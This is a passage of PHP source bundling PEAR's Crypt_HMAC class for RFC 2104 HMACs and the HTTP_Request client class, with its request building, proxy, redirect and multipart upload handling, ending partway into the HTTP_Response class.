<?php
/* vim: set expandtab tabstop=4 shiftwidth=4 softtabstop=4: */

/**
 * Class to calculate RFC 2104 compliant hashes
 *
 *
 * PHP versions 4 and 5
 *
 * LICENSE: This source file is subject to version 3.0 of the PHP license
 * that is available through the world-wide-web at the following URI:
 * http://www.php.net/license/3_0.txt.  If you did not receive a copy of
 * the PHP License and are unable to obtain it through the web, please
 * send a note to license@php.net so we can mail you a copy immediately.
 *
 * @category   Encryption
 * @package    Crypt_HMAC
 * @author     Derick Rethans <derick@php.net>
 * @author     Matthew Fonda <mfonda@dotgeek.org>
 * @copyright  1997-2005 The PHP Group
 * @license    http://www.php.net/license/3_0.txt  PHP License 3.0
 * @version    CVS: $Id: HMAC.php,v 1.3 2005/02/20 19:18:29 mfonda Exp $
 * @link       http://pear.php.net/package/Crypt_HMAC
 */




/**
* Calculates RFC 2104 compliant HMACs
*
* @access     public
* @category   Encryption
* @package    Crypt_HMAC
* @author     Derick Rethans <derick@php.net>
* @author     Matthew Fonda <mfonda@dotgeek.org>
* @copyright  1997-2005 The PHP Group
* @license    http://www.php.net/license/3_0.txt  PHP License 3.0
* @link       http://pear.php.net/package/Crypt_HMAC
*/   
class Crypt_HMAC 
{

    /**
    * Hash function to use
    * @public string
    * @access private
    */
    public $_func;

    /**
    * Inner padded key
    * @public string
    * @access private
    */
    public $_ipad;

    /**
    * Outer padded key
    * @public string
    * @access private
    */
    public $_opad;
    
    /**
    * Pack format
    * @public string
    * @access private
    */
    public $_pack;
    
    
    /**
    * Constructor
    * Pass method as first parameter
    *
    * @param string $key  Key to use for hash
    * @param string $func  Hash function used for the calculation
    * @return void
    * @access public
    */
    function Crypt_HMAC($key, $func = 'md5')
    {
        $this->setFunction($func);
        $this->setKey($key);
    }
    
    
    /**
    * Sets hash function
    *
    * @param string $func  Hash function to use
    * @return void
    * @access public
    */
    function setFunction($func)
    {
        if (!$this->_pack = $this->_getPackFormat($func)) {
            die('Unsupported hash function');
        }
        $this->_func = $func;
    }
    
    
    /**
    * Sets key to use with hash
    *
    * @param string $key
    * @return void
    * @access public
    */
    function setKey($key)
    {
        /* 
        * Pad the key as the RFC wishes
        */
        $func = $this->_func;
        
        if (strlen($key) > 64) {
           $key =  pack($this->_pack, $func($key));
        }
        if (strlen($key) < 64) {
            $key = str_pad($key, 64, chr(0));
        }
        

        /* Calculate the padded keys and save them */
        $this->_ipad = (substr($key, 0, 64) ^ str_repeat(chr(0x36), 64));
        $this->_opad = (substr($key, 0, 64) ^ str_repeat(chr(0x5C), 64));
    }
    
    
    /**
    * Gets pack formats for specifed hash function
    *
    * @param string $func
    * @return mixed  false if hash function doesnt exist, pack format on success
    * @access private
    */
    function _getPackFormat($func)
    {
        $packs = array('md5' => 'H32', 'sha1' => 'H40');
        return isset($packs[$func]) ? $packs[$func] : false;
    }
    
    
    /**
    * Hashing function
    *
    * @param  string $data  string that will encrypted
    * @return string
    * @access public
    */
    function hash($data)
    {
        $func = $this->_func;
        return $func($this->_opad . pack($this->_pack, $func($this->_ipad . $data)));
    }

}


?><?php
/**
 * Class for performing HTTP requests
 *
 * PHP versions 4 and 5
 * 
 * LICENSE:
 *
 * Copyright (c) 2002-2007, Richard Heyes
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * o Redistributions of source code must retain the above copyright
 *   notice, this list of conditions and the following disclaimer.
 * o Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 * o The names of the authors may not be used to endorse or promote
 *   products derived from this software without specific prior written
 *   permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * @category    HTTP
 * @package     HTTP_Request
 * @author      Richard Heyes <richard@phpguru.org>
 * @author      Alexey Borzov <avb@php.net>
 * @copyright   2002-2007 Richard Heyes
 * @license     http://opensource.org/licenses/bsd-license.php New BSD License
 * @version     CVS: $Id: Request.php,v 1.55 2007/05/18 19:20:12 avb Exp $
 * @link        http://pear.php.net/package/HTTP_Request/ 
 */

/**
 * PEAR and PEAR_Error classes (for error handling)
 */
require_once 'PEAR.php';
/**
 * Socket class
 */
require_once 'Socket.php';
/**
 * URL handling class
 */ 

require_once 'URL.php';

/**#@+
 * Constants for HTTP request methods
 */ 
define('HTTP_REQUEST_METHOD_GET',     'GET',     true);
define('HTTP_REQUEST_METHOD_HEAD',    'HEAD',    true);
define('HTTP_REQUEST_METHOD_POST',    'POST',    true);
define('HTTP_REQUEST_METHOD_PUT',     'PUT',     true);
define('HTTP_REQUEST_METHOD_DELETE',  'DELETE',  true);
define('HTTP_REQUEST_METHOD_OPTIONS', 'OPTIONS', true);
define('HTTP_REQUEST_METHOD_TRACE',   'TRACE',   true);
/**#@-*/

/**#@+
 * Constants for HTTP protocol versions
 */
define('HTTP_REQUEST_HTTP_VER_1_0', '1.0', true);
define('HTTP_REQUEST_HTTP_VER_1_1', '1.1', true);
/**#@-*/

if (extension_loaded('mbstring') && (2 & ini_get('mbstring.func_overload'))) {
   /**
    * Whether string functions are overloaded by their mbstring equivalents 
    */
    define('HTTP_REQUEST_MBSTRING', true);
} else {
   /**
    * @ignore
    */
    define('HTTP_REQUEST_MBSTRING', false);
}

/**
 * Class for performing HTTP requests
 *
 * Simple example (fetches yahoo.com and displays it):
 * <code>
 * $a = &new HTTP_Request('http://www.yahoo.com/');
 * $a->sendRequest();
 * echo $a->getResponseBody();
 * </code>
 *
 * @category    HTTP
 * @package     HTTP_Request
 * @author      Richard Heyes <richard@phpguru.org>
 * @author      Alexey Borzov <avb@php.net>
 * @version     Release: 1.4.1
 */
class HTTP_Request
{
   /**#@+
    * @access private
    */
    /**
    * Instance of Net_URL
    * @public Net_URL
    */
    public $_url;

    /**
    * Type of request
    * @public string
    */
    public $_method;

    /**
    * HTTP Version
    * @public string
    */
    public $_http;

    /**
    * Request headers
    * @public array
    */
    public $_requestHeaders;

    /**
    * Basic Auth Username
    * @public string
    */
    public $_user;
    
    /**
    * Basic Auth Password
    * @public string
    */
    public $_pass;

    /**
    * Socket object
    * @public Net_Socket
    */
    public $_sock;
    
    /**

    * Proxy server
    * @public string
    */
    public $_proxy_host;
    
    /**
    * Proxy port
    * @public integer
    */
    public $_proxy_port;
    
    /**
    * Proxy username
    * @public string
    */
    public $_proxy_user;
    
    /**
    * Proxy password
    * @public string
    */
    public $_proxy_pass;

    /**
    * Post data
    * @public array
    */
    public $_postData;

   /**
    * Request body  
    * @public string
    */
    public $_body;

   /**
    * A list of methods that MUST NOT have a request body, per RFC 2616
    * @public array
    */
    public $_bodyDisallowed = array('TRACE');

   /**
    * Files to post 
    * @public array
    */
    public $_postFiles = array();

    /**
    * Connection timeout.
    * @public float
    */
    public $_timeout;
    
    /**
    * HTTP_Response object
    * @public HTTP_Response
    */
    public $_response;
    
    /**
    * Whether to allow redirects
    * @public boolean
    */
    public $_allowRedirects;
    
    /**
    * Maximum redirects allowed
    * @public integer
    */
    public $_maxRedirects;
    
    /**
    * Current number of redirects
    * @public integer
    */
    public $_redirects;

   /**
    * Whether to append brackets [] to array publiciables
    * @public bool
    */
    public $_useBrackets = true;

   /**
    * Attached listeners
    * @public array
    */
    public $_listeners = array();

   /**
    * Whether to save response body in response object property  
    * @public bool
    */
    public $_saveBody = true;

   /**
    * Timeout for reading from socket (array(seconds, microseconds))
    * @public array
    */
    public $_readTimeout = null;

   /**
    * Options to pass to Net_Socket::connect. See stream_context_create
    * @public array
    */
    public $_socketOptions = null;
   /**#@-*/

    /**
    * Constructor
    *
    * Sets up the object
    * @param    string  The url to fetch/access
    * @param    array   Associative array of parameters which can have the following keys:
    * <ul>
    *   <li>method         - Method to use, GET, POST etc (string)</li>
    *   <li>http           - HTTP Version to use, 1.0 or 1.1 (string)</li>
    *   <li>user           - Basic Auth username (string)</li>
    *   <li>pass           - Basic Auth password (string)</li>
    *   <li>proxy_host     - Proxy server host (string)</li>
    *   <li>proxy_port     - Proxy server port (integer)</li>
    *   <li>proxy_user     - Proxy auth username (string)</li>
    *   <li>proxy_pass     - Proxy auth password (string)</li>
    *   <li>timeout        - Connection timeout in seconds (float)</li>
    *   <li>allowRedirects - Whether to follow redirects or not (bool)</li>
    *   <li>maxRedirects   - Max number of redirects to follow (integer)</li>
    *   <li>useBrackets    - Whether to append [] to array publiciable names (bool)</li>
    *   <li>saveBody       - Whether to save response body in response object property (bool)</li>
    *   <li>readTimeout    - Timeout for reading / writing data over the socket (array (seconds, microseconds))</li>
    *   <li>socketOptions  - Options to pass to Net_Socket object (array)</li>
    * </ul>
    * @access public
    */
    function HTTP_Request($url = '', $params = array())
    {
        $this->_method         =  HTTP_REQUEST_METHOD_GET;
        $this->_http           =  HTTP_REQUEST_HTTP_VER_1_1;
        $this->_requestHeaders = array();
        $this->_postData       = array();
        $this->_body           = null;

        $this->_user = null;
        $this->_pass = null;

        $this->_proxy_host = null;
        $this->_proxy_port = null;
        $this->_proxy_user = null;
        $this->_proxy_pass = null;

        $this->_allowRedirects = false;
        $this->_maxRedirects   = 3;
        $this->_redirects      = 0;

        $this->_timeout  = null;
        $this->_response = null;

        foreach ($params as $key => $value) {
            $this->{'_' . $key} = $value;
        }

        if (!empty($url)) {
            $this->setURL($url);
        }

        // Default useragent
        $this->addHeader('User-Agent', 'PEAR HTTP_Request class ( http://pear.php.net/ )');

        // We don't do keep-alives by default
        $this->addHeader('Connection', 'close');

        // Basic authentication
        if (!empty($this->_user)) {
            $this->addHeader('Authorization', 'Basic ' . base64_encode($this->_user . ':' . $this->_pass));
        }

        // Proxy authentication (see bug #5913)
        if (!empty($this->_proxy_user)) {
            $this->addHeader('Proxy-Authorization', 'Basic ' . base64_encode($this->_proxy_user . ':' . $this->_proxy_pass));
        }

        // Use gzip encoding if possible
        if (HTTP_REQUEST_HTTP_VER_1_1 == $this->_http && extension_loaded('zlib')) {
            $this->addHeader('Accept-Encoding', 'gzip');
        }
    }
    
    /**
    * Generates a Host header for HTTP/1.1 requests
    *
    * @access private
    * @return string
    */
    function _generateHostHeader()
    {
        if ($this->_url->port != 80 AND strcasecmp($this->_url->protocol, 'http') == 0) {
            $host = $this->_url->host . ':' . $this->_url->port;

        } elseif ($this->_url->port != 443 AND strcasecmp($this->_url->protocol, 'https') == 0) {
            $host = $this->_url->host . ':' . $this->_url->port;

        } elseif ($this->_url->port == 443 AND strcasecmp($this->_url->protocol, 'https') == 0 AND strpos($this->_url->url, ':443') !== false) {
            $host = $this->_url->host . ':' . $this->_url->port;
        
        } else {
            $host = $this->_url->host;
        }

        return $host;
    }
    
    /**
    * Resets the object to its initial state (DEPRECATED).
    * Takes the same parameters as the constructor.
    *
    * @param  string $url    The url to be requested
    * @param  array  $params Associative array of parameters
    *                        (see constructor for details)
    * @access public
    * @deprecated deprecated since 1.2, call the constructor if this is necessary
    */
    function reset($url, $params = array())
    {
        $this->HTTP_Request($url, $params);
    }

    /**
    * Sets the URL to be requested
    *
    * @param  string The url to be requested
    * @access public
    */
    function setURL($url)
    {
        $this->_url = &new Net_URL($url, $this->_useBrackets);

        if (!empty($this->_url->user) || !empty($this->_url->pass)) {
            $this->setBasicAuth($this->_url->user, $this->_url->pass);
        }

        if (HTTP_REQUEST_HTTP_VER_1_1 == $this->_http) {
            $this->addHeader('Host', $this->_generateHostHeader());
        }

        // set '/' instead of empty path rather than check later (see bug #8662)
        if (empty($this->_url->path)) {
            $this->_url->path = '/';
        } 
    }
    
   /**
    * Returns the current request URL  
    *
    * @return   string  Current request URL
    * @access   public
    */
    function getUrl()
    {
        return empty($this->_url)? '': $this->_url->getUrl();
    }

    /**
    * Sets a proxy to be used
    *
    * @param string     Proxy host
    * @param int        Proxy port
    * @param string     Proxy username
    * @param string     Proxy password
    * @access public
    */
    function setProxy($host, $port = 8080, $user = null, $pass = null)
    {
        $this->_proxy_host = $host;
        $this->_proxy_port = $port;
        $this->_proxy_user = $user;
        $this->_proxy_pass = $pass;

        if (!empty($user)) {
            $this->addHeader('Proxy-Authorization', 'Basic ' . base64_encode($user . ':' . $pass));
        }
    }

    /**
    * Sets basic authentication parameters
    *
    * @param string     Username
    * @param string     Password
    */
    function setBasicAuth($user, $pass)
    {
        $this->_user = $user;
        $this->_pass = $pass;

        $this->addHeader('Authorization', 'Basic ' . base64_encode($user . ':' . $pass));
    }

    /**
    * Sets the method to be used, GET, POST etc.
    *
    * @param string     Method to use. Use the defined constants for this
    * @access public
    */
    function setMethod($method)
    {
        $this->_method = $method;
    }

    /**
    * Sets the HTTP version to use, 1.0 or 1.1
    *
    * @param string     Version to use. Use the defined constants for this
    * @access public
    */
    function setHttpVer($http)
    {
        $this->_http = $http;
    }

    /**
    * Adds a request header
    *
    * @param string     Header name
    * @param string     Header value
    * @access public
    */
    function addHeader($name, $value)
    {
        $this->_requestHeaders[strtolower($name)] = $value;
    }

    /**
    * Removes a request header
    *
    * @param string     Header name to remove
    * @access public
    */
    function removeHeader($name)
    {
        if (isset($this->_requestHeaders[strtolower($name)])) {
            unset($this->_requestHeaders[strtolower($name)]);
        }
    }

    /**
    * Adds a querystring parameter
    *
    * @param string     Querystring parameter name
    * @param string     Querystring parameter value
    * @param bool       Whether the value is already urlencoded or not, default = not
    * @access public
    */
    function addQueryString($name, $value, $preencoded = false)
    {
        $this->_url->addQueryString($name, $value, $preencoded);
    }    
    
    /**
    * Sets the querystring to literally what you supply
    *
    * @param string     The querystring data. Should be of the format foo=bar&x=y etc
    * @param bool       Whether data is already urlencoded or not, default = already encoded
    * @access public
    */
    function addRawQueryString($querystring, $preencoded = true)
    {
        $this->_url->addRawQueryString($querystring, $preencoded);
    }

    /**
    * Adds postdata items
    *
    * @param string     Post data name
    * @param string     Post data value
    * @param bool       Whether data is already urlencoded or not, default = not
    * @access public
    */
    function addPostData($name, $value, $preencoded = false)
    {
        if ($preencoded) {
            $this->_postData[$name] = $value;
        } else {
            $this->_postData[$name] = $this->_arrayMapRecursive('urlencode', $value);
        }
    }

   /**
    * Recursively applies the callback function to the value
    * 
    * @param    mixed   Callback function
    * @param    mixed   Value to process
    * @access   private
    * @return   mixed   Processed value
    */
    function _arrayMapRecursive($callback, $value)
    {
        if (!is_array($value)) {
            return call_user_func($callback, $value);
        } else {
            $map = array();
            foreach ($value as $k => $v) {
                $map[$k] = $this->_arrayMapRecursive($callback, $v);
            }
            return $map;
        }
    }

   /**
    * Adds a file to upload
    * 
    * This also changes content-type to 'multipart/form-data' for proper upload
    * 
    * @access public
    * @param  string    name of file-upload field
    * @param  mixed     file name(s)
    * @param  mixed     content-type(s) of file(s) being uploaded
    * @return bool      true on success
    * @throws PEAR_Error
    */
    function addFile($inputName, $fileName, $contentType = 'application/octet-stream')
    {
        if (!is_array($fileName) && !is_readable($fileName)) {
            return PEAR::raiseError("File '{$fileName}' is not readable");
        } elseif (is_array($fileName)) {
            foreach ($fileName as $name) {
                if (!is_readable($name)) {
                    return PEAR::raiseError("File '{$name}' is not readable");
                }
            }
        }
        $this->addHeader('Content-Type', 'multipart/form-data');
        $this->_postFiles[$inputName] = array(
            'name' => $fileName,
            'type' => $contentType
        );
        return true;
    }

    /**
    * Adds raw postdata (DEPRECATED)
    *
    * @param string     The data
    * @param bool       Whether data is preencoded or not, default = already encoded
    * @access public
    * @deprecated       deprecated since 1.3.0, method setBody() should be used instead
    */
    function addRawPostData($postdata, $preencoded = true)
    {
        $this->_body = $preencoded ? $postdata : urlencode($postdata);
    }

   /**
    * Sets the request body (for POST, PUT and similar requests)
    *
    * @param    string  Request body
    * @access   public
    */
    function setBody($body)
    {
        $this->_body = $body;
    }

    /**
    * Clears any postdata that has been added (DEPRECATED). 
    * 
    * Useful for multiple request scenarios.
    *
    * @access public
    * @deprecated deprecated since 1.2
    */
    function clearPostData()
    {
        $this->_postData = null;
    }

    /**
    * Appends a cookie to "Cookie:" header
    * 
    * @param string $name cookie name
    * @param string $value cookie value
    * @access public
    */
    function addCookie($name, $value)
    {
        $cookies = isset($this->_requestHeaders['cookie']) ? $this->_requestHeaders['cookie']. '; ' : '';
        $this->addHeader('Cookie', $cookies . $name . '=' . $value);
    }
    
    /**
    * Clears any cookies that have been added (DEPRECATED). 
    * 
    * Useful for multiple request scenarios
    *
    * @access public
    * @deprecated deprecated since 1.2
    */
    function clearCookies()
    {
        $this->removeHeader('Cookie');
    }

    /**
    * Sends the request
    *
    * @access public
    * @param  bool   Whether to store response body in Response object property,
    *                set this to false if downloading a LARGE file and using a Listener
    * @return mixed  PEAR error on error, true otherwise
    */
    function sendRequest($saveBody = true)
    {
        if (!is_a($this->_url, 'Net_URL')) {
            return PEAR::raiseError('No URL given.');
        }

        $host = isset($this->_proxy_host) ? $this->_proxy_host : $this->_url->host;
        $port = isset($this->_proxy_port) ? $this->_proxy_port : $this->_url->port;

        // 4.3.0 supports SSL connections using OpenSSL. The function test determines
        // we running on at least 4.3.0
        if (strcasecmp($this->_url->protocol, 'https') == 0 AND function_exists('file_get_contents') AND extension_loaded('openssl')) {
            if (isset($this->_proxy_host)) {
                return PEAR::raiseError('HTTPS proxies are not supported.');
            }
            $host = 'ssl://' . $host;
        }

        // magic quotes may fuck up file uploads and chunked response processing
        $magicQuotes = ini_get('magic_quotes_runtime');
        ini_set('magic_quotes_runtime', false);

        // RFC 2068, section 19.7.1: A client MUST NOT send the Keep-Alive 
        // connection token to a proxy server...
        if (isset($this->_proxy_host) && !empty($this->_requestHeaders['connection']) &&
            'Keep-Alive' == $this->_requestHeaders['connection'])
        {
            $this->removeHeader('connection');
        }

        $keepAlive = (HTTP_REQUEST_HTTP_VER_1_1 == $this->_http && empty($this->_requestHeaders['connection'])) ||
                     (!empty($this->_requestHeaders['connection']) && 'Keep-Alive' == $this->_requestHeaders['connection']);
        $sockets   = &PEAR::getStaticProperty('HTTP_Request', 'sockets');
        $sockKey   = $host . ':' . $port;
        unset($this->_sock);

        // There is a connected socket in the "static" property?
        if ($keepAlive && !empty($sockets[$sockKey]) &&
            !empty($sockets[$sockKey]->fp)) 
        {
            $this->_sock =& $sockets[$sockKey];
            $err = null;
        } else {
            $this->_notify('connect');
            $this->_sock =& new Net_Socket();
            $err = $this->_sock->connect($host, $port, null, $this->_timeout, $this->_socketOptions);
        }
        PEAR::isError($err) or $err = $this->_sock->write($this->_buildRequest());

        if (!PEAR::isError($err)) {
            if (!empty($this->_readTimeout)) {
                $this->_sock->setTimeout($this->_readTimeout[0], $this->_readTimeout[1]);
            }

            $this->_notify('sentRequest');

            // Read the response
            $this->_response = &new HTTP_Response($this->_sock, $this->_listeners);
            $err = $this->_response->process(
                $this->_saveBody && $saveBody,
                HTTP_REQUEST_METHOD_HEAD != $this->_method
            );

            if ($keepAlive) {
                $keepAlive = (isset($this->_response->_headers['content-length'])
                              || (isset($this->_response->_headers['transfer-encoding'])
                                  && strtolower($this->_response->_headers['transfer-encoding']) == 'chunked'));
                if ($keepAlive) {
                    if (isset($this->_response->_headers['connection'])) {
                        $keepAlive = strtolower($this->_response->_headers['connection']) == 'keep-alive';
                    } else {
                        $keepAlive = 'HTTP/'.HTTP_REQUEST_HTTP_VER_1_1 == $this->_response->_protocol;
                    }
                }
            }
        }

        ini_set('magic_quotes_runtime', $magicQuotes);

        if (PEAR::isError($err)) {
            return $err;
        }

        if (!$keepAlive) {
            $this->disconnect();
        // Store the connected socket in "static" property
        } elseif (empty($sockets[$sockKey]) || empty($sockets[$sockKey]->fp)) {
            $sockets[$sockKey] =& $this->_sock;
        }

        // Check for redirection
        if (    $this->_allowRedirects
            AND $this->_redirects <= $this->_maxRedirects
            AND $this->getResponseCode() > 300
            AND $this->getResponseCode() < 399
            AND !empty($this->_response->_headers['location'])) {

            
            $redirect = $this->_response->_headers['location'];

            // Absolute URL
            if (preg_match('/^https?:\/\//i', $redirect)) {
                $this->_url = &new Net_URL($redirect);
                $this->addHeader('Host', $this->_generateHostHeader());
            // Absolute path
            } elseif ($redirect{0} == '/') {
                $this->_url->path = $redirect;
            
            // Relative path
            } elseif (substr($redirect, 0, 3) == '../' OR substr($redirect, 0, 2) == './') {
                if (substr($this->_url->path, -1) == '/') {
                    $redirect = $this->_url->path . $redirect;
                } else {
                    $redirect = dirname($this->_url->path) . '/' . $redirect;
                }
                $redirect = Net_URL::resolvePath($redirect);
                $this->_url->path = $redirect;
                
            // Filename, no path
            } else {
                if (substr($this->_url->path, -1) == '/') {
                    $redirect = $this->_url->path . $redirect;
                } else {
                    $redirect = dirname($this->_url->path) . '/' . $redirect;
                }
                $this->_url->path = $redirect;
            }

            $this->_redirects++;
            return $this->sendRequest($saveBody);

        // Too many redirects
        } elseif ($this->_allowRedirects AND $this->_redirects > $this->_maxRedirects) {
            return PEAR::raiseError('Too many redirects');
        }

        return true;
    }

    /**
     * Disconnect the socket, if connected. Only useful if using Keep-Alive.
     *
     * @access public
     */
    function disconnect()
    {
        if (!empty($this->_sock) && !empty($this->_sock->fp)) {
            $this->_notify('disconnect');
            $this->_sock->disconnect();
        }
    }

    /**
    * Returns the response code
    *
    * @access public
    * @return mixed     Response code, false if not set
    */
    function getResponseCode()
    {
        return isset($this->_response->_code) ? $this->_response->_code : false;
    }

    /**
    * Returns either the named header or all if no name given
    *
    * @access public
    * @param string     The header name to return, do not set to get all headers
    * @return mixed     either the value of $headername (false if header is not present)
    *                   or an array of all headers
    */
    function getResponseHeader($headername = null)
    {
        if (!isset($headername)) {
            return isset($this->_response->_headers)? $this->_response->_headers: array();
        } else {
            $headername = strtolower($headername);
            return isset($this->_response->_headers[$headername]) ? $this->_response->_headers[$headername] : false;
        }
    }

    /**
    * Returns the body of the response
    *
    * @access public
    * @return mixed     response body, false if not set
    */
    function getResponseBody()
    {
        return isset($this->_response->_body) ? $this->_response->_body : false;
    }

    /**
    * Returns cookies set in response
    * 
    * @access public
    * @return mixed     array of response cookies, false if none are present
    */
    function getResponseCookies()
    {
        return isset($this->_response->_cookies) ? $this->_response->_cookies : false;
    }

    /**
    * Builds the request string
    *
    * @access private
    * @return string The request string
    */
    function _buildRequest()
    {
        $separator = ini_get('arg_separator.output');
        ini_set('arg_separator.output', '&');
        $querystring = ($querystring = $this->_url->getQueryString()) ? '?' . $querystring : '';
        ini_set('arg_separator.output', $separator);

        $host = isset($this->_proxy_host) ? $this->_url->protocol . '://' . $this->_url->host : '';
        $port = (isset($this->_proxy_host) AND $this->_url->port != 80) ? ':' . $this->_url->port : '';
        $path = $this->_url->path . $querystring;
        $url  = $host . $port . $path;

        $request = $this->_method . ' ' . $url . ' HTTP/' . $this->_http . "\r\n";

        if (in_array($this->_method, $this->_bodyDisallowed) ||
            (empty($this->_body) && (HTTP_REQUEST_METHOD_POST != $this->_method ||
             (empty($this->_postData) && empty($this->_postFiles)))))
        {
            $this->removeHeader('Content-Type');
        } else {
            if (empty($this->_requestHeaders['content-type'])) {
                // Add default content-type
                $this->addHeader('Content-Type', 'application/x-www-form-urlencoded');
            } elseif ('multipart/form-data' == $this->_requestHeaders['content-type']) {
                $boundary = 'HTTP_Request_' . md5(uniqid('request') . microtime());
                $this->addHeader('Content-Type', 'multipart/form-data; boundary=' . $boundary);
            }
        }

        // Request Headers
        if (!empty($this->_requestHeaders)) {
            foreach ($this->_requestHeaders as $name => $value) {
                $canonicalName = implode('-', array_map('ucfirst', explode('-', $name)));
                $request      .= $canonicalName . ': ' . $value . "\r\n";
            }
        }

        // No post data or wrong method, so simply add a final CRLF
        if (in_array($this->_method, $this->_bodyDisallowed) || 
            (HTTP_REQUEST_METHOD_POST != $this->_method && empty($this->_body))) {

            $request .= "\r\n";

        // Post data if it's an array
        } elseif (HTTP_REQUEST_METHOD_POST == $this->_method && 
                  (!empty($this->_postData) || !empty($this->_postFiles))) {

            // "normal" POST request
            if (!isset($boundary)) {
                $postdata = implode('&', array_map(
                    create_function('$a', 'return $a[0] . \'=\' . $a[1];'), 
                    $this->_flattenArray('', $this->_postData)
                ));

            // multipart request, probably with file uploads
            } else {
                $postdata = '';
                if (!empty($this->_postData)) {
                    $flatData = $this->_flattenArray('', $this->_postData);
                    foreach ($flatData as $item) {
                        $postdata .= '--' . $boundary . "\r\n";
                        $postdata .= 'Content-Disposition: form-data; name="' . $item[0] . '"';
                        $postdata .= "\r\n\r\n" . urldecode($item[1]) . "\r\n";
                    }
                }
                foreach ($this->_postFiles as $name => $value) {
                    if (is_array($value['name'])) {
                        $publicname       = $name . ($this->_useBrackets? '[]': '');
                    } else {
                        $publicname       = $name;
                        $value['name'] = array($value['name']);
                    }
                    foreach ($value['name'] as $key => $filename) {
                        $fp   = fopen($filename, 'r');
                        $data = fread($fp, filesize($filename));
                        fclose($fp);
                        $basename = basename($filename);
                        $type     = is_array($value['type'])? @$value['type'][$key]: $value['type'];

                        $postdata .= '--' . $boundary . "\r\n";
                        $postdata .= 'Content-Disposition: form-data; name="' . $publicname . '"; filename="' . $basename . '"';
                        $postdata .= "\r\nContent-Type: " . $type;
                        $postdata .= "\r\n\r\n" . $data . "\r\n";
                    }
                }
                $postdata .= '--' . $boundary . "--\r\n";
            }
            $request .= 'Content-Length: ' .
                        (HTTP_REQUEST_MBSTRING? mb_strlen($postdata, 'iso-8859-1'): strlen($postdata)) .
                        "\r\n\r\n";
            $request .= $postdata;

        // Explicitly set request body
        } elseif (!empty($this->_body)) {

            $request .= 'Content-Length: ' .
                        (HTTP_REQUEST_MBSTRING? mb_strlen($this->_body, 'iso-8859-1'): strlen($this->_body)) .
                        "\r\n\r\n";
            $request .= $this->_body;
        }
        
        return $request;
    }

   /**
    * Helper function to change the (probably multidimensional) associative array
    * into the simple one.
    *
    * @param    string  name for item
    * @param    mixed   item's values
    * @return   array   array with the following items: array('item name', 'item value');
    * @access   private
    */
    function _flattenArray($name, $values)
    {
        if (!is_array($values)) {
            return array(array($name, $values));
        } else {
            $ret = array();
            foreach ($values as $k => $v) {
                if (empty($name)) {
                    $newName = $k;
                } elseif ($this->_useBrackets) {
                    $newName = $name . '[' . $k . ']';
                } else {
                    $newName = $name;
                }
                $ret = array_merge($ret, $this->_flattenArray($newName, $v));
            }
            return $ret;
        }
    }


   /**
    * Adds a Listener to the list of listeners that are notified of
    * the object's events
    * 
    * Events sent by HTTP_Request object
    * - 'connect': on connection to server
    * - 'sentRequest': after the request was sent
    * - 'disconnect': on disconnection from server
    *
    * Events sent by HTTP_Response object
    * - 'gotHeaders': after receiving response headers (headers are passed in $data)
    * - 'tick': on receiving a part of response body (the part is passed in $data)
    * - 'gzTick': on receiving a gzip-encoded part of response body (ditto)
    * - 'gotBody': after receiving the response body (passes the decoded body in $data if it was gzipped)
    *
    * @param    HTTP_Request_Listener   listener to attach
    * @return   boolean                 whether the listener was successfully attached
    * @access   public
    */
    function attach(&$listener)
    {
        if (!is_a($listener, 'HTTP_Request_Listener')) {
            return false;
        }
        $this->_listeners[$listener->getId()] =& $listener;
        return true;
    }


   /**
    * Removes a Listener from the list of listeners 
    * 
    * @param    HTTP_Request_Listener   listener to detach
    * @return   boolean                 whether the listener was successfully detached
    * @access   public
    */
    function detach(&$listener)
    {
        if (!is_a($listener, 'HTTP_Request_Listener') || 
            !isset($this->_listeners[$listener->getId()])) {
            return false;
        }
        unset($this->_listeners[$listener->getId()]);
        return true;
    }


   /**
    * Notifies all registered listeners of an event.
    * 
    * @param    string  Event name
    * @param    mixed   Additional data
    * @access   private
    * @see      HTTP_Request::attach()
    */
    function _notify($event, $data = null)
    {
        foreach (array_keys($this->_listeners) as $id) {
            $this->_listeners[$id]->update($this, $event, $data);
        }
    }
}


/**
 * Response class to complement the Request class
 *
 * @category    HTTP
 * @package     HTTP_Request
 * @author      Richard Heyes <richard@phpguru.org>
 * @author      Alexey Borzov <avb@php.net>
 * @version     Release: 1.4.1
 */
class HTTP_Response
{
    /**
    * Socket object
    * @public Net_Socket
    */
    public $_sock;

    /**
    * Protocol
    * @public string
    */
    public $_protocol;
    
    /**
    * Return code
    * @public string
    */
    public $_code;
    
    /**
    * Response headers
    * @public array
    */
    public $_headers;

    /**
    * Cookies set in response  
    * @public array
    */
    public $_cookies;

    /**
    * Response body
    * @public string
    */
    public $_body = '';

   /**
    * Used by _readChunked(): remaining length of the current chunk
    * @public string
    */
    public $_chunkLength = 0;

   /**
    * Attached listeners
    * @public array
    */
    public $_listeners = array();

   /**
    * Bytes left to read from message-body
    * @public null|int
    */
    public $_toRead;

    /**
    * Constructor
    *
    * @param  Net_Socket    socket to read the response from
    * @param  array         listeners attached to request
    */
    function HTTP_Response(&$sock, &$listeners)
    {
        $this->_sock      =& $sock;
        $this->_listeners =& $listeners;
    }


   /**
    * Processes a HTTP response
    * 
    * This extracts response code, headers, cookies and decodes body if it 
    * was encoded in some way
    *
